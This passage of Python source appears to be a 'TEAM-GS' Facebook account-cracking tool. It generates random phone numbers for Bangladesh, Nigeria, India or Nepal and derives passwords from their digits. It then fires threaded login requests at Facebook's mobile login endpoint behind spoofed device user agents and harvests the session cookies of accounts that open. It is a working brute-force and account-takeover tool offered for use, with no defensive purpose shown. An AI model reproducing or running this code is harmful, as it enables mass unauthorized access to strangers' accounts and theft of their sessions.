    mix = random.choice(["SM-T835","SM-S901U","SM-S134DL","SM-J250F","SM-A217F","SM-A326B","SM-A125F","SM-A720F","SM-A326U","SM-G532M","SM-J410G","SM-A205GN","SM-A205GN","SM-A505GN","SM-G930F","SM-J210F","SM-N9005","SM-J210F","CPH2083","CPH2235", "CPH2499","CPH2185","CPH2065","CPH2197","CPH1989","CPH2145","F1w","CPH1909","CPH2065","CPH1937","CPH2095","CPH2083","CPH2249","CPH2083","CPH2239","CPH1979","CPH2067","CPH2069","CPH2239","CPH2015","CPH2021","CPH2205","CPH2069","CPH2161","CPH2207","CPH2239","CPH1909","CPH2185","CPH2127","CPH1923","CPH1931","PHN110", "CPH2599", "CPH2499", "CPH2557", "CPH8686", "CPH9177", "CPH9226", "OPPO F1 Plus", "CPH2071", "PCHM00", "CPH2083", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH2477", "CPH2471", "CPH2591", "CPH1923", "CPH1925", "CPH1837", "OPPO A30","RMX1945", "RMX1911", "RMX2193", "RMX1945", "RMX1931", "RMX2170", "RMX3201", "RMX2180", "RMX2021", "RMX2020", "RMX2155", "RMX1921", "RMX2156", "RMX3363", "RMX3081", "RMX2001", "RMX2001", "RMX3263", "RMX2155", "RMX2001", "RMX3195", "RMX1945", "RMX1945", "RMX1993","vi"+"vo 1901","V2"+"026","V20"+"58","viv"+"o 1716","vi"+"vo 1808","vi"+"vo 1935","vi"+"vo 1951","vi"+"vo 1906","vivo 1808","vivo 1920","vivo 1901", "V2026","V2058","vivo 1716","vivo 1935","vivo 1951","vivo 1906","V2111","vivo 1915","V1911A","V2036","vivo 1907","vivo 1906","vivo 1915","V2025","vivo 1820","vivo 1904","vivo 1901","V1955A","LG-H342","Redmi Note 4", "Redmi 4X", "Redmi 3", "Redmi 4", "Redmi 3X", "Redmi Note 7", "Redmi 6A", "Redmi Note 8 Pro", "Redmi 5A", "Redmi 5", "Redmi 6 Pro", "Redmi Note 5", "Redmi Note 4", "Redmi Y2", "Redmi 7A", "Redmi Note 7S", "Redmi Note 8T", "Redmi Note 8 Pro", "M2003J15SC", "Redmi 5 Plus", "Redmi Note 9 Pro", "Redmi Note 9S", "LDN-L21", "M2103K19G","RMX1945","RMX1911","RMX2193","RMX1945","RMX1931","RMX2170","RMX3201","RMX2180","RMX2021","RMX2020","RMX2155","RMX1921","RMX2156","RMX3363","RMX3081","RMX2001","RMX2001","RMX3263","RMX2155","RMX2001","RMX3195","RMX1945","RMX1945","RMX1993","RMX2180","RMX3630","RMX3686","RMX1805","RMX1801","RMX2020","RMX1811","RMX3063","RMX3516","RMX3371","RMX3461","RMX3286","RMX3561","RMX3388","RMX3311","RMX3142","RMX2071","RMX1805","RMX1809","RMX1801","RMX1807","RMX1803","RMX1825","RMX1821","RMX1822","RMX1833","RMX1851","RMX1853","RMX1827","RMX1911","RMX1919","RMX1927","RMX1971","RMX1973","RMX2030","RMX2032","RMX1925","RMX1929","RMX2001","RMX2061","RMX2063","RMX2040","RMX2042","RMX2002","RMX2151","RMX2163","RMX2155","RMX2170","RMX2103","RMX3085","RMX3241","RMX3081","RMX3151","RMX3381","RMX3521","RMX3474","RMX3471","RMX3472","RMX3392","RMX3393","RMX3491","RMX1811","RMX2185","RMX3231","RMX2189","RMX2180","RMX2195","RMX2101","RMX1941","RMX1945","RMX3063","RMX3061","RMX3201","RMX3203","RMX3261","RMX3263","RMX3193","RMX3191","RMX3195","RMX3197","RMX3265","RMX3268","RMX3269","RMX2027","RMX2020","RMX2021","RMX3581","RMX3501","RMX3503","RMX3511","RMX3310","RMX3312","RMX3551","RMX3301","RMX3300","RMX2202","RMX3363","RMX3360","RMX3366","RMX3361","RMX3031","RMX3370","RMX3357","RMX3560","RMX3562","RMX3350","RMX2193","RMX2161","RMX2050","RMX2156","RMX3242","RMX3171","RMX3430","RMX3235","RMX3506","RMX2117","RMX2173","RMX3161","RMX2205","RMX3462","RMX3478","RMX3372","RMX3574","RMX1831","RMX3121","RMX3122","RMX3125","RMX3043","RMX3042","RMX3041","RMX3092","RMX3093","RMX3571","RMX3475","RMX2200","RMX2201","RMX2111","RMX2112","RMX1901","RMX1903","RMX1992","RMX1993","RMX1991","RMX1931","RMX2142","RMX2081","RMX2085","RMX2083","RMX2086","RMX2144","RMX2051","RMX2025","RMX2075","RMX2076","RMX2072","RMX2052","RMX2176","RMX2121","RMX3115","RMX1921","vivo 1906","vivo 1904","vivo Y13L","vivo 1901","V2120","V2204","vivo 1902","V2310","V2333","vivo 1929","vivo 1915","vivo 1811","V2027","V2043","V2038","V2111","V2110","V2206","V2207","vivo Y23L","V2249","vivo 1613","vivo Y28L","vivo 1938","PADM00","CPH1837","PADT00","CPH1803","CPH1853","CPH1805","CPH1931","CPH1959","CPH1933","CPH1935","CPH1943","CPH1909","CPH1901","PDBM00","CPH1941","CPH2179","CPH2083","CPH2185","CPH2185","CPH2477","CPH2591","CHP2219","CPH1923","CPH2213","CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"])
    fban = random.choice(["FB4A","FB5A","FB6A"])
    facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
    fb_ver_code = str(random.randint(10000000, 66666666))
    density = random.choice(['1.0','1.7','2.0','2.25','2.5','3.0','3.5'])
    width = random.randint(720, 1440)
    height = random.randint(1080, 2560)
    fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
    sim_name = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Skitto","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
    fbpn = random.choice(["com.facebook.katana","com.facebook.orca","messenger-android","com.facebook.lite"])
    fbmf = 'Realme'
    fbbd = 'Realme'
    mobile_model = f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
    modelx = random.choice(["RMX3871","RMX5011","RMX3709","RMX3951","RMX3987","RMX2063","RMX5003","RMX3092","RMX3115","RMX1921","RMX2071","RMX3300","RMX3551","RMX2195","RMX3393","RMX2050","RMX3987","RMX2117","RMX3690","RMX2180"])
    last = f"[FBAN/{fban};FBAV/{facebook_version};FBBV/{fb_ver_code};FBDM/{{density={density},width={width},height={height}}};FBLC/{fblc};FBCR/{sim_name};FBMF/{fbmf};FBBD/{fbbd};FBPN/{fbpn};FBDV/{modelx};FBSV/{mobile_model};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {mix} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+last
    return ua

def RANDM():
    dalvik_version = f"{random.randint(1, 2)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
    android_version = random.choice(["5.1.1", "6.0", "7.0", "8.1.0", "9", "10", "11"])  
    brands = {
        "Infinix": ["X657", "X6812", "X6815", "X650C", "Infinix X6511B"],
        "Tecno": ["KA7", "LC7", "KB7", "LB7", "Tecno CX"],
        "Itel": ["A16", "A33", "P33", "S15", "A36"],
        "Samsung": ["SM-J600F", "SM-A107F", "SM-G610F"],
        "Xiaomi": ["Redmi 9A", "Redmi Note 8", "M2101K6G"],
        "Huawei": ["HUAWEI Y5", "HUAWEI Y7 Prime"]
    }
    brand = random.choice(list(brands.keys()))
    model = random.choice(brands[brand])
    build = random.choice(['PKQ1', 'LMY47V', 'NRD90M', 'MMB29M', 'QP1A.190711.020'])
    fb_ver = f"{random.randint(150, 437)}.0.0.{random.randint(1, 99)}.{random.randint(0, 200)}"
    
    user_agent = (
        f"Dalvik/{dalvik_version} (Linux; U; Android {android_version}; {model} Build/{build}) "
        f"[FBAN/FB4A;FBAV/{fb_ver};FBPN/com.facebook.katana;FBLC/en_NG;FBBV/{random.randint(10000000,99999999)};"
        f"FBCR/{random.choice(['MTN NG', 'Glo NG', 'Airtel NG', '9mobile'])};FBMF/{brand};FBBD/{brand};"
        f"FBDV/{model};FBSV/{android_version};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    )    
    return user_agent

fbav_list = ["542.0.0.50.100", "543.0.0.55.73", "543.0.0.56.73", "544.0.0.12.101"]
devices = ["SM-A546E", "SM-S928B", "Redmi Note 12", "JNY-LX1", "Pixel 8"]
densities = ["2.75", "3.0", "3.5", "4.0"]
heights = ["2340", "2400", "1920", "3200"]
carriers = ["Grameenphone", "Robi", "Banglalink", "Teletalk", "Airtel"]
langs = ["en_US", "bn_BD", "de_DE"]
def uass():
    av = random.choice(fbav_list)
    dv = random.choice(devices)
    den = random.choice(densities)
    h = random.choice(heights)
    lc = random.choice(langs)
    cr = random.choice(carriers)
    fbdm = f"{{density={den},width=1080,height={h}}}"
    return f"[FBAN/FB4A;FBAV/{av};FBBV/{random.randint(550000000, 570000000)};FBDM/{fbdm};FBLC/{lc};FBRV/0;FBCR/{cr};FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{dv};FBSV/{random.randint(13,16)};FBOP/19;FBCA/arm64-v8a:;]"

##-------------[LOGO VIEW]-------------##
def ____banner____():
    if "win" in sys.platform:
        os.system("cls")
    else:
        os.system("clear")
    print(f"""{W}
    +---------------------------------+
    | OWNER   {Y}: {W}TEAM-GS               |
    | TOOLS  {Y} : {W}RANDOM                |
    | W.NUMB  {Y}: {W}80000XXXXX            |
    | VERSION{Y} : {W}V{Y}-{orang}2.3{W}                 |
    +---------------------------------+""")
##-------------[ DEF RANDOM CLONE]-------------##
def ___random_main___():
    ____banner____()
    print(f"    {W}[{Y}1{W}]{G} Random Bangladesh \n    {W}[{Y}2{W}]{G} Random Nigeria\n    {W}[{Y}3{W}]{G} Random India\n    {W}[{Y}4{W}]{G} Random Nepal")
    linex()
    country = input(f'    {W}[{Y}✓{W}] {G}CHOICE  {W}: {Y}')
    ____banner____()    
    if country == "1":
        print(f'    {W}[{Y}✓{W}]  Example {Y}:{G} 0171, 0192, 0181')
        digit_length = 7
    elif country == "2":
        print(f'    {W}[{Y}✓{W}]  Example {Y}:{G} 0902, 0706, 0806')
        digit_length = 7
    elif country == "3":
        print(f'    {W}[{Y}✓{W}]  Example {Y}:{G} 6390, 6354, 8521')
        digit_length = 6
    elif country == "4":
        print(f'    {W}[{Y}✓{W}]  Example {Y}:{G} 9843, 9765, 9816, 9741')
        digit_length = 6
    else:
        print(f"    {W}[{Y}✓{W}]  Choice Correct Country :)")
        time.sleep(2)
        return
    linex()
    code = input(f'    {W}[{Y}✓{W}]  Sim Code {Y}:{G} ')
    linex()
    print(f'    {W}[{Y}✓{W}]  Example {Y}:{G} 20000 / 30000 / 99999')
    linex()    
    try:
        limit = int(input(f"    {W}[{Y}✓{W}]  Limit{Y} :{G} "))
    except:
        limit = 99999    
    for _ in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(digit_length))
        user.append(nmp)    
    linex()
    print(f"    {W}[{Y}1{W}]{G} Auto Password \n    {W}[{Y}2{W}]{G} Manual Password")
    linex()
    pstype = input(f'    {W}[{Y}✓{W}] {G}CHOICE  {W}: {Y}')
    if pstype == "1":
        if country == "1":
            for pasx in ["first6", "first7", "first8", "last11", "last6", "last7", "last8"]:
                plist.append(pasx)
            linex()
        elif country == "2":
            for pasx in ["first6", "first7", "first8", "last11", "last6", "last7", "last8"]:
                plist.append(pasx)
            linex()
        elif country == "3":
            for pasx in ["first6", "first7", "first8", "last6", "last8"]:
                plist.append(pasx)
            linex()
        elif country == "4":
            for pasx in ["first6", "first7", "first8", "last6", "last7", "last8"]:
                plist.append(pasx)
            linex()
    else:
        linex()
        try:
            pslimit = int(input(f"    {W}[{Y}✓{W}]  Pass Limit{Y} :{G} "))
        except:
            pslimit = 8
        linex()
        print(f"    {W}[{Y}✓{W}]  Ex > first6,last6,first7,etc...")
        linex()
        for x in range(pslimit):
            pwx = input(f"    {W}[{Y}✓{W}]  Password [{x+1}] > ")
            plist.append(pwx)
    ____banner____()
    print(f'    {W}[{Y}1{W}] {orang}Example {Y}: {G}{W} ({G}Host Best{W})')
    print(f'    {W}[{Y}2{W}] {orang}Example {Y}: {G}{W} ({G}Graphql{W})')
    linex()
    mtd = input(f'    {W}[{Y}✓{W}] {G}CHOICE  {W}: {Y}')
    linex()
    print(f"    {W}[{Y}1{W}]{G} Crack Speed {W}[{Y}Normal{W}] \n    {W}[{Y}2{W}]{G} Cracking Speed {W}[{G}High{W}]")
    linex()
    spd = input(f'    {W}[{Y}✓{W}] {G}CHOICE  {W}: {Y}')
    if spd == "1":
        speed = 40
    else:
        speed = int(input(f'    {W}[{Y}✓{W}] {G}SPEED   {W}: {Y}'))
    with tred(max_workers=speed) as executor:
        ____banner____()
        print(f'    {W}[{Y}✓{W}] TOTAL IDS {W}: {Y}{limit}{W}/{W}SIM CODE {rad} : {W}({G}{code}{W})')
        print(f'    {W}[{Y}✓{W}] IF NO RESULT {W}[{G}AIRPLANE MODE{W}] {G}ON{W}/{rad}OFF')
        print(f'    {W}[{Y}✓{W}] SPEED {W}:[{G} {speed} {W}] {G}update date / time {W}- {rad} 05 Jul 2026 / 11:00')
        linex()
        for love in user:
            ids = code + love
            if mtd == "1":
                executor.submit(_TEAM_RANDOM_M1, ids)
            elif mtd == "2":
                executor.submit(_TEAM_RANDOM_M2, ids)
            else:
                executor.submit(_TEAM_RANDOM_M2, ids)
    print("")
    linex()
    print(f'    {W}[{Y}✓{W}] The Process Has Been Completed')
    print(f'    {W}[{Y}✓{W}] Total Ok {Y} : {G} {str(len(oks))}')
    print(f'    {W}[{Y}✓{W}] Total Cp  {Y}: {RR} {str(len(cps))}{W}')
    input(f'    {W}[{Y}✓{W}] Thanks For Using My Tool')
    ___random_main___()
##-------------[PASS MANAGER]-------------##
def pwmanager(num, type_):
    if 'first' in type_:
        try:
            code = type_.split('t')[1]
            password = num[:int(code)]
        except:
            password = num
    elif 'last' in type_:
        try:
            code = type_.split('t')[1]
            password = num[-int(code):]
        except:
            password = num
    else:
        password = type_
    return password

##-------------[METHOD M1]-------------##
def _TEAM_RANDOM_M1(ids):
    global loop, oks, cps
    _clor_ = random.choice(["\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m","\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m","\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"])
    sys.stdout.write(f'\r\r    {W}[{G}TEAM-GS{Y}-{G}M1{W}]{Y}-{W}[{PP}{_clor_}{loop}{W}]{Y}-{W}[{G}OK{Y}-{G}{len(oks)}{W}]{Y}-{W}[{G}CP{Y}-{PP}{len(cps)}{W}]')
    sys.stdout.flush()
    try:
        for pw in plist:
            pas = pwmanager(ids, pw)
            session = requests.session()
            link = session.get("https://touch.facebook.com/").text
            rr = random.randint
            pros = random.choice(ugen)
            data = {
            '__aaid': '0',
            '__user': '0',
            '__a': '1',
            '__req': '8',
            '__hs': '20639.BP:wbloks_caa_pkg.2.0...0',
            'dpr': '3',
            '__ccg': 'EXCELLENT',
            '__rev': str(random.randint(1000000000,1999999999)),
            '__s': 'ihdj0f:sz0puj:ugar6y',
            '__hsi': str(int(time.time() * 10000000)),
            '__dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x67o1g8hw23E52q1ew2io0D24o1MUaE1Do1u81x82ewnE3fwww5NyE25w8W0Lo6-1CwOw5jw4JwzK0zo3jwea',
            'fb_dtsg': 'NAfxN9k_hmFG42EZYE4Qmpc4faqEiuV_FjjER8nNJtK7o3FXucpmKRQ:0:0',
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(link)).group(1), 
            'lsd': re.search('name="lsd" value="(.*?)"', str(link)).group(1), 
            'params': '{"params":"{\\"server_params\\":{\\"credential_type\\":\\"password\\",\\"username_text_input_id\\":\\"xm00dg:63\\",\\"password_text_input_id\\":\\"xm00dg:64\\",\\"login_source\\":\\"Login\\",\\"login_credential_type\\":\\"none\\",\\"server_login_source\\":\\"login\\",\\"ar_event_source\\":\\"login_home_page\\",\\"should_trigger_override_login_success_action\\":0,\\"should_trigger_override_login_2fa_action\\":0,\\"is_caa_perf_enabled\\":0,\\"reg_flow_source\\":\\"login_home_native_integration_point\\",\\"caller\\":\\"gslr\\",\\"is_from_landing_page\\":0,\\"is_from_empty_password\\":0,\\"is_from_aymh\\":0,\\"is_from_password_entry_page\\":0,\\"is_from_assistive_id\\":0,\\"is_from_msplit_fallback\\":0,\\"two_step_login_type\\":\\"one_step_login\\",\\"is_vanilla_password_page_empty_password\\":0,\\"left_nav_button_action\\":\\"NONE\\",\\"INTERNAL__latency_qpl_marker_id\\":36707139,\\"INTERNAL__latency_qpl_instance_id\\":\\"203233584400366\\",\\"device_id\\":null,\\"family_device_id\\":null,\\"waterfall_id\\":\\"'+str(uuid.uuid4())+'\\",\\"offline_experiment_group\\":null,\\"layered_homepage_experiment_group\\":null,\\"is_platform_login\\":0,\\"is_from_logged_in_switcher\\":0,\\"is_from_logged_out\\":0,\\"access_flow_version\\":\\"pre_mt_behavior\\"},\\"client_input_params\\":{\\"machine_id\\":\\"\\",\\"cloud_trust_token\\":null,\\"block_store_machine_id\\":\\"\\",\\"zero_balance_state\\":\\"\\",\\"contact_point\\":\\"'+ids+'\\",\\"password\\":\\"#PWD_BROWSER:0:'+str(int(time.time()))+':'+pas+'\\",\\"accounts_list\\":[],\\"fb_ig_device_id\\":[],\\"secure_family_device_id\\":\\"\\",\\"encrypted_msisdn\\":\\"\\",\\"headers_infra_flow_id\\":\\"\\",\\"try_num\\":1,\\"login_attempt_count\\":1,\\"event_flow\\":\\"login_manual\\",\\"event_step\\":\\"home_page\\",\\"openid_tokens\\":{},\\"auth_secure_device_id\\":\\"\\",\\"client_known_key_hash\\":\\"\\",\\"has_whatsapp_installed\\":0,\\"sso_token_map_json_string\\":\\"\\",\\"should_show_nested_nta_from_aymh\\":0,\\"password_contains_non_ascii\\":\\"false\\",\\"has_granted_read_contacts_permissions\\":0,\\"has_granted_read_phone_permissions\\":0,\\"app_manager_id\\":\\"\\",\\"aymh_accounts\\":[{\\"id\\":\\"\\",\\"profiles\\":{\\"id\\":{\\"user_id\\":\\"\\",\\"name\\":\\"\\",\\"profile_picture_url\\":\\"\\",\\"small_profile_picture_url\\":null,\\"notification_count\\":0,\\"credential_type\\":\\"none\\",\\"token\\":\\"\\",\\"last_access_time\\":0,\\"is_derived\\":0,\\"username\\":\\"\\",\\"password\\":\\"\\",\\"has_smartlock\\":0,\\"account_center_id\\":\\"\\",\\"account_source\\":\\"\\",\\"credentials\\":[],\\"nta_eligibility_reason\\":null,\\"from_accurate_privacy_result\\":0,\\"dbln_validated\\":0}}}],\\"network_bssid\\":null,\\"lois_settings\\":{\\"lois_token\\":\\"\\"},\\"aac\\":\\"\\"}}"}',
}     
            versions = ["99.0.4844.88", "100.0.4896.127", "101.0.4951.41", "102.0.5005.78", "103.0.5060.70"]
            version = random.choice(versions)
            languages = ["en-GB,en-US;q=0.9,en;q=0.8", "en-GB,en;q=0.8", "bn-BD,bn;q=0.9,en;q=0.8", "hi-IN,hi;q=0.9,en;q=0.8"]
            gtts = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550 5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','G-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']                       
            headers = {
            "method": "POST",
            "authority": "m.facebook.com",
            "path": "/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action",
            "scheme": "https",
            "content-length": str(len(str(data))),
            "sec-ch-ua": f"\"Not A;Brand\";v=\"8\", \"Chromium\";v=\"{version.split('.')[0]}\", \"Google Chrome\";v=\"{version.split('.')[0]}\"",
            "sec-ch-ua-mobile": "?1",
            "user-agent": pros,
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "sec-ch-ua-platform-version": f"\"{random.randint(10,15)}.0.0\"",
            "sec-ch-ua-full-version-list": f"\"Not A;Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"{version}\", \"Google Chrome\";v=\"{version}\"",
            "sec-ch-ua-model": random.choice(gtts),
            "sec-ch-prefers-color-scheme": random.choice(["light", "dark"]),
            "sec-ch-ua-platform": "\"Android\"",
            "accept": "*/*",
            "origin": "https://m.facebook.com",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://m.facebook.com/ig/login_via/app/?lid=0IHXHk8cbGEgI6VjI&bn=Y29tLmFuZHJvaWQuY2hyb21l&tade=Q7fLBQE63OOS%2B03YZt5qWGFJx45uX%2Fc6STvNmPZCdQaywoJnnCZxQf7vt4u5kxBXtpDxfodkEPlvdxtARHWp14PhMWFndjNMDbX%2Bqz%2BFXtJG%2FbUw8HuZ3EFqs%2Bel5yaPMKeUWEcByA%3D%3D",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": random.choice(languages),}
            session.post('https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=95c2f471fdc717a6b79ae75e26e90a643f5613e03d463667d5b99baf34570f30',headers=headers,data=data).text
            TEAM_GS_test = session.cookies.get_dict().keys()
            if "c_user" in TEAM_GS_test:
                cookie = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                uid = cookie.split("c_user=")[1].split(";")[0]
                ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
